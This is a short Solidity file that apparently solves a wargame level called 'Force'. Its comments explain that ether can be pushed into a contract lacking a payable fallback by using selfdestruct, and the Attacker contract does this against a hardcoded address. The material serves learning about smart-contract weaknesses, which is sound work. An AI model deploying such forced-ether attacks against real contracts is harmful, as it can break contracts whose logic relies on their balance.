// The Force contract has no fallback function so we can't send money to it. It doesn't have any other method to send money. But there exist other way to send money to any contract and it consists in using function "selfdestruct" that it just sends the money from the contract is called (think of this only triggered by owner or special role).

// To attack deploy this contract replacing with the attacked contract address, send some wei and call attack.

contract Attacker{

  function attack() public {
    selfdestruct(0xeb50e00ae6b1ebea0c4112d2778d03cb95f83a09);
  }
  
  function () payable {}
}
